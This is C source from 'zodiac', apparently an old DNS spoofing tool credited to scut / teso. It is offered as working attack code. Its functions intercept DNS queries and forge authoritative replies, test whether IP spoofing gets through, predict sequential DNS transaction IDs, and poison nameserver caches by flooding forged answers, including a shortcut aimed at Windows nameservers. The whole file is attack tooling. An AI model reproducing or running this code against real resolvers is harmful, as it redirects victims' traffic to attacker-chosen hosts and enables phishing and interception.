/* zodiac - advanced dns spoofer
 *
 * by scut / teso
 *
 * spoofing routines
 */

#include <stdlib.h>
#include <string.h>
#include "common.h"
#include "dns.h"
#include "dns-build.h"
#include "dns-spoof.h"
#include "dns-spoof-int.h"
#include "dns-tools.h"
#include "dnsid.h"
#include "dnsq.h"
#include "network.h"
#include "output.h"
#include "packet.h"
#include "zodiac.h"


extern struct in_addr localip;


/* spoof_local
 *
 * install a spoof handler that will transparently spoof local requests.
 * the calling function has to launch an extra thread to do this in
 * background *yeah*.
 *
 * used spoof_style_local variables:
 *
 *   spoof_victim      what local lookupers should be affected
 *   spoof_type        T_A (name to ip) or T_PTR (ip to domain) spoof
 *   spoof_from        ip / host that should be spoofed
 *   spoof_to          wrong resolve for spoof_from
 *   local_dns         nameserver that should be responsible for the domain
 *   local_dns_ip      ip of the responsible nameserver local_dns
 *
 * return in any case
 */

void
spoof_local (spoof_style_local	*cs)
{
	int		n;	/* temporary return value */
	int		desc;	/* filter descriptor */
	struct in_addr	ip_src, ip_dst;	/* ip's (temporary) */
	char		*query;

	/* from any address to the local nameserver
	 */
	ip_src.s_addr = net_resolve (cs->spoof_victim);	/* NULL = any, != NULL, only this client */
	ip_dst.s_addr = net_resolve ("*");		/* can be "*" */

	if (cs->spoof_type == T_PTR) {
		/* convert the ip address to a encoded ptr query within
		 * the .in-addr.arpa domain :)
		 */
		query = dns_build_ptr (cs->spoof_from);
	} else if (cs->spoof_type == T_A) {
		/* domain name is equal to decoded query :)
		 */
		query = xstrdup (cs->spoof_from);
	} else {
		return;
	}

	/* install a virtual dns packet filter
	 */
	desc = dq_filter_install (
		ip_src,			/* dns queries from source IP */
		ip_dst,			/* nameserver or any IP */
		0,			/* source port, we don't care :) */
		53,			/* dns port, we care about queries */
		0, 0, 0,		/* a local spoof, we don't care about the DNS ID's */
		query);			/* query content (only spoof a name / ip) */

	/* installing the handler shouldn't cause any error :-) hopefully
	 */
	if (desc == -1)
		return;

	/* wait indefinitly
	 */
	while (dq_filter_wait (desc, NULL) == 1) {

		char		*ip_src, *ip_dst;
		ip_hdr		*ip;		/* pointer to ip header */
		udp_hdr		*udp;		/* pointer to udp header */
		dns_hdr		*dns;		/* pointer to dns header */
		unsigned char	*dns_data;	/* pointer to dns data part within packet */

		dns_pdata	*pd;		/* dns data part of the packet */
		dq_packet	*catch =	/* catched packet */
			dq_p_get (desc);

		char		*dns_sld = NULL;


		/* if we didn't caught the packet (?), abort
		 */

		if (catch == NULL) {
			m_printf (ms, ms->winproc, "[zod] !ERROR! FILTER TRIGGERED, BUT NO PACKET\n");
			goto sp_local_fail;
		}

		m_printf (ms, ms->winproc, "[zod] SPOOF LOCAL GOT PACKET\n");

		/* axe the packet, *yeah*
		 */
		pq_offset (catch->packet, &ip, &udp, &dns, &dns_data);

		/* get spoofed nameserver domain, depending on spoof type =)
		 */
		if (cs->spoof_type == T_A)
			dns_sld = dns_domain (cs->spoof_from);
		else if (cs->spoof_type == T_PTR)
			dns_sld = dns_domain (cs->spoof_to);

		pd = dns_build_new ();
		dns_build_q (pd, cs->spoof_from, cs->spoof_type, C_IN);
		dns_build_rr (pd, cs->spoof_from, cs->spoof_type, C_IN, 86400, cs->spoof_to);
		dns_build_rr (pd, dns_sld, T_NS, C_IN, 86400, cs->local_dns);
		dns_build_rr (pd, cs->local_dns, T_A, C_IN, 86400, cs->local_dns_ip);

		/* fire the packet, yeah :)
		 * flip source/destination ip/port, while doing it :)
		 */
		net_printipa (&ip->ip_dst, &ip_src);
		net_printipa (&ip->ip_src, &ip_dst);

		n = dns_packet_send (ip_src, ip_dst,
			htons (udp->uh_dport), htons (udp->uh_sport), htons (dns->id),
			DF_RESPONSE | DF_AA | DF_RD | DF_RA, 1, 1, 1, 1, pd, 1);

		free (ip_src);
		free (ip_dst);

		/* destroy created and catched packets
		 */
		dns_build_destroy (pd);
		dq_p_free (catch);
	}

sp_local_fail:

	free (query);
	dq_filter_uninstall (desc);

	/* someone ripped us off, let's do him a favor ;-)
	 */
	return;
}


/* spoof_ip_check
 *
 * check whether ip spoofing is possible using the current network.
 * to do this it queries the `ns' nameserver for a host within `ourdomain'.
 * if we see this ip-spoofed packet the spoof succeeded.
 *
 * return 1 if we are capable of spoofing
 * return 0 if we are not *doh* !
 * return -1 if not even unspoofed packets get through
 */

int
spoof_ip_check (char *ns, char *ourdomain)
{
	char		*rnd_aa_host;
	dns_pdata	*qpacket;
	struct in_addr	s_addr,
			d_addr;
	int		desc,
			n = 0,
			test_unspoofed = 0,
			test_spoofed = 0;
	char		*ip_random,
			*ip_local;
	struct timeval	tval;

	tval.tv_sec = 25;
	tval.tv_usec = 0;

	qpacket = dns_build_new ();
	rnd_aa_host = dns_build_random (ourdomain, 0);
	m_printf (ms, ms->winproc, "[zod] (unspoofed) A? \"%s\" @ %s\n", rnd_aa_host, ns);
	dns_build_q (qpacket, rnd_aa_host, T_A, C_IN);

	s_addr.s_addr = d_addr.s_addr = net_resolve ("*");

	/* some nameservers will query from different ports then 53, so we
	 * leave the source port of the filter to zero, but we are not going
	 * to catch our own packets because of own-packets-marking :)
	 */
	desc = dq_filter_install (s_addr, d_addr, 0, 53, 0, 0, 0, rnd_aa_host);
	free (rnd_aa_host);

	/* first send an unspoofed packet
	 */
	ip_local = net_getlocalip ();
	dns_packet_send (ip_local, ns, m_random (1024, 50000),
		53, m_random (1, 65535), DF_RD, 1, 0, 0, 0, qpacket, 0);
	free (ip_local);
	test_unspoofed = dq_filter_wait (desc, &tval);

	/* not even unspoofed dns packets work !
	 */
	if (test_unspoofed == 0) {
		n = -1;
		goto sic_err;
	}

	dq_filter_uninstall (desc);
	dns_build_destroy (qpacket);
	qpacket = dns_build_new ();
	rnd_aa_host = dns_build_random (ourdomain, 0);
	m_printf (ms, ms->winproc, "[zod] (spoofed) A? \"%s\" @ %s\n", rnd_aa_host, ns);
	dns_build_q (qpacket, rnd_aa_host, T_A, C_IN);
	desc = dq_filter_install (s_addr, d_addr, 0, 53, 0, 0, 0, rnd_aa_host);
	free (rnd_aa_host);

	/* now try with a spoofed one
	 */
	ip_random = ip_get_random ();
	dns_packet_send (ip_random, ns, m_random (1024, 50000),
		53, m_random (1, 65535), DF_RD, 1, 0, 0, 0, qpacket, 0);
	free (ip_random);

	test_spoofed = dq_filter_wait (desc, &tval);
	if (test_spoofed != 0)
		n = 1;		/* fear the spewfer */

sic_err:
	dns_build_destroy (qpacket);
	dq_filter_uninstall (desc);

	return (n);
}


/* spoof_query
 *
 * ask a nameserver `nameserver' for a random host inside our domain
 * `ourdomain'. wait for a question to our local ip from this nameserver
 * for a maximum duration of `timeout' seconds.
 * Returns the address of the querying nameserver to the address pointed
 * to by proxy. -smiler 990925.
 *
 * return 1 if the nameserver responded
 * return 0 if it didn't
 */

int
spoof_query (char *nameserver, char *ourdomain, int timeout, struct in_addr *proxy)
{
	int		desc;
	int		n = 0;
	dns_pdata	*qpacket;	/* query packet data */
	char		*rnd_aa_host;	/* random authoritative domain */
	char		*local_ip;
	struct in_addr	s_addr,
			d_addr;
	struct timeval	tv;
	struct timeval	*tval = &tv;

	local_ip = net_getlocalip ();

	qpacket = dns_build_new ();
	rnd_aa_host = dns_build_random (ourdomain, 0);
	m_printf (ms, ms->winproc, "[zod] A? \"%s\" @ %s\n", rnd_aa_host, nameserver);
	dns_build_q (qpacket, rnd_aa_host, T_A, C_IN);

	s_addr.s_addr = net_resolve (/*nameserver*/ "*");
	d_addr.s_addr = net_resolve (local_ip);

	desc = dq_filter_install (s_addr, d_addr, 0, 53, 0, 0, 0, rnd_aa_host);
	free (rnd_aa_host);

	dns_packet_send (local_ip, nameserver, m_random (1024, 50000),
		53, m_random (1, 65535), DF_RD, 1, 0, 0, 0, qpacket, 0);
	dns_build_destroy (qpacket);
	free (local_ip);

	if (timeout == 0) {
		tval = NULL;
	} else {
		tv.tv_usec = 0;
		tv.tv_sec = timeout;
	}

	n = dq_filter_wait (desc, tval);
	if (n != 0) {
		dq_packet *catch;
		catch = dq_p_get(desc);
		if (!catch) {
			m_printf(ms, ms->winproc, "[zod] filter error!\n");
			return 0;
		}
		proxy->s_addr = ((ip_hdr *)catch->packet)->ip_src.s_addr;
	}
	dq_filter_uninstall (desc);

	return (n);
}


/* spoof_jizz
 *
 * launch a jizz spoof according to the information in the configset `cs'.
 * the caller function should create a new thread and fire this function in
 * background
 *
 * expect:
 *
 * cs->
 *	nameserver	nameserver to jield cache up
 *	local_domain	domain name, the local dns is authoritative for
 *	local_dns_ip	ip of the nameserver the query will be directed to
 *	spoof_from	domain name to do a A/PTR spoof on
 *	spoof_to	ip to do a PTR/A spoof on
 *
 * return in any case :)
 */


void
spoof_jizz (spoof_style_jizz *cs)
{
	u_short		src_prt = m_random (1024, 65535);
	u_short		dns_id = m_random (1, 65535);
	int		desc;
	struct in_addr	s_addr,
			d_addr;
	dns_pdata	*qpacket;	/* query packet data */
	dns_pdata	*apacket;	/* answer packet data */
	char		*rnd_aa_host;	/* random authoritative domain */
	char		local_ip[20];

	net_printip (&localip, local_ip, sizeof(local_ip) - 1);

	/* first construct a query packet
	 */
	qpacket = dns_build_new ();
	rnd_aa_host = strdup (cs->local_domain);
/*	rnd_aa_host = dns_build_random (cs->local_domain);	*/
	dns_build_q (qpacket, rnd_aa_host, T_SOA, C_IN);

	/* also construct an answer packet (to save time)
	 */
	apacket = dns_build_new ();
	dns_build_q (apacket, rnd_aa_host, T_SOA, C_IN);
	dns_build_rr (apacket, rnd_aa_host, T_A, C_IN, 120, local_ip);
	dns_build_rr (apacket, cs->spoof_from, T_A, C_IN, 120, cs->spoof_to);
	dns_build_rr (apacket, dns_domain (cs->local_domain), T_A, C_IN, 120,
		local_ip);
	dns_build_rr (apacket, dns_domain (cs->local_domain), T_NS, C_IN, 120,
		dns_domain (cs->local_domain));
	dns_build_rr (apacket, cs->spoof_to, T_PTR, C_IN, 120,
		cs->spoof_from);

	/* install a packet filter
	 */
	s_addr.s_addr = net_resolve ("*");
	d_addr.s_addr = net_resolve (local_ip);

	desc = dq_filter_install (s_addr, d_addr, 0, 53, 0, 0, 0, rnd_aa_host);

	free (rnd_aa_host);
	free (local_ip);

	if (desc == -1)
		return;

	/* launch query packet, then destroy it :)
	 * spoof here if you want to, i don't want =)
	 */
	dns_packet_send (local_ip, cs->nameserver, src_prt, 53, dns_id, 0, 1, 0, 0, 0, qpacket, 0);
	dns_build_destroy (qpacket);

	/* wait for the packet
	 */
	if (dq_filter_wait (desc, NULL) == 1) {
		char		*ip_src, *ip_dst;
		ip_hdr		*ip;		/* pointer to ip header */
		udp_hdr		*udp;		/* pointer to udp header */
		dns_hdr		*dns;		/* pointer to dns header */
		unsigned char	*dns_data;	/* pointer to dns data part within packet */

		dq_packet	*catch =	/* catched packet */
			dq_p_get (desc);

		if (catch == NULL) {
			m_printf (ms, ms->winproc, "[zod] !ERROR! FILTER TRIGGERED, BUT NO PACKET\n");
			goto sp_local_fail;
		}

		pq_offset (catch->packet, &ip, &udp, &dns, &dns_data);

		net_printipa (&ip->ip_dst, &ip_src);
		net_printipa (&ip->ip_src, &ip_dst);

		/* launch answer packet
		 */
		dns_packet_send (ip_src, ip_dst, htons (udp->uh_dport), htons (udp->uh_sport),
			htons (dns->id), DF_RESPONSE | DF_AA | DF_RD | DF_RA,
			1, 3, 1, 1, apacket, 1);

		free (ip_src);
		free (ip_dst);
		dq_p_free (catch);
	}

	/* uninstall packet filter
	 * hope, we spoofed, yeah :-)
	 */
sp_local_fail:
	dns_build_destroy (apacket);
}


void
spoof_dnsid (spoof_style_id *cs)
{
	struct in_addr	*auth_ns[SPOOF_ID_MAX],
			proxy;
	char		proxy_str[20];
	spoof_id_list	*link;
	int		i	= 0,
			tries	= 0,
			cnt	= 0;
	int		dns_id;
	struct timeval	tv;
	unsigned long int flags;

	if (cs->id_cnt > SPOOF_ID_MAX) /* shouldn't happen */
		return;

	for (link = cs->root; link; link = link->next, i++) {
		int err;

		auth_ns[i] = dt_ns_get_auth (cs->nameserver,
				link->spoof_from_domain, &err);
		if (auth_ns[i] == NULL) {
			m_printf (ms, ms->winproc, "[zod] couldn't get list of authority for %s: %s\n",
				cs->nameserver, dterrlist[err]);
			return;
		}
	}

	m_printf (ms, ms->winproc, "[zod] trying to get my hands on the dns id\n");

	while ((cnt < 3) && (tries < 5)) {
		if (spoof_query (cs->nameserver, cs->local_domain, 10, &proxy))
			cnt++;
		tries++;
	}

	net_printip (&proxy, proxy_str, sizeof (proxy_str) - 1);
	dns_id = id_get (proxy_str, &tv, &flags);
	if (dns_id == 0) {
		m_printf (ms, ms->winproc, "[zod] welp, i didn't manage to get the magic id :(\n");
		return;
	} else if ((flags & IDF_SEQ) != IDF_SEQ) {
		m_printf (ms, ms->winproc, "[zod] nameserver responded, but has nonsequential id's :((\n");
		return;
	}

	m_printf (ms, ms->winproc, "[zod] received responses from: %s\n", proxy_str);
	m_printf (ms, ms->winproc, "[zod] sequential id: %hu [age: %d]\n", dns_id, tv.tv_sec);

	/* poison the cache */
	m_printf (ms, ms->winproc, "[zod] poisoning... phear\n");

	i = 0;

	/* we start with the dns_id here, but in case it is a windows
	 * nameserver we don't go through the mess, we just send
	 * dns id's of 0 to 20 out, which will most likely be ok. -sc
	 */
	if ((flags & IDF_WINDUMB) == IDF_WINDUMB) {
		dns_id = 0;
		m_printf (ms, ms->winproc, "[zod] remote is windows, trying id 0 to 20\n");
	}

	for (link = cs->root ; link != NULL ; link = link->next, i++) {
		spoof_poison (cs->nameserver, proxy, auth_ns[i], dns_id + i,
			link->spoof_from, link->spoof_to, link->spoof_type);
	}


	return;
}


/* spoof_poison
 *
 * try to poison the cache of 'victim'
 * send a spoofed request to victim, and /quickly/ send responses
 * from *all* ipz in the array '*auth_ns' with ids close to 'victim_id'
 * to 'proxy'
 *
 * Note: if itz already cached, then it wont work!
 *
 * -smiler
 */

void
spoof_poison (char *victim, struct in_addr proxy, struct in_addr *auth_ns,
		int dns_id, char *spoof_from, char *spoof_to, int type)
{
	dns_pdata		*spoof_query,
				*fake_reply;
	char			proxy_str[20],
				localip_str[20],
				ns_str[20];
	int			i,
				j, k;

	if (type != T_A && type != T_PTR && type != T_NS)
		return;

	net_printip (&proxy, proxy_str, sizeof (proxy_str) - 1);
	net_printip (&localip, localip_str, sizeof (localip_str) - 1);
 	spoof_query = dns_build_new ();	
	fake_reply = dns_build_new ();

	dns_build_q (spoof_query, spoof_from, type, C_IN);

	dns_build_q (fake_reply, spoof_from, type, C_IN);
	dns_build_rr (fake_reply, spoof_from, type, C_IN, 100000, spoof_to);

	for (k = 0; k < 2; k++)
	dns_packet_send (localip_str, victim, m_random (1024, 50000),
		53, m_random (1, 65535), DF_RD, 1, 0, 0, 0, spoof_query, 0); 

	for (k = 0; k < 2; k++)
	for (i = dns_id + 1; i < (dns_id + 20); ++i) {
		for (j = 0; auth_ns[j].s_addr != INADDR_ANY; ++j) {
			net_printip (&auth_ns[j], ns_str, sizeof (ns_str) - 1);
			dns_packet_send (ns_str, proxy_str, 53, 53, i,
				DF_RESPONSE | DF_AA, 1, 1, 0, 0, fake_reply, 0);
		}
	}

	dns_build_destroy (fake_reply);
	dns_build_destroy (spoof_query);

	return;
}


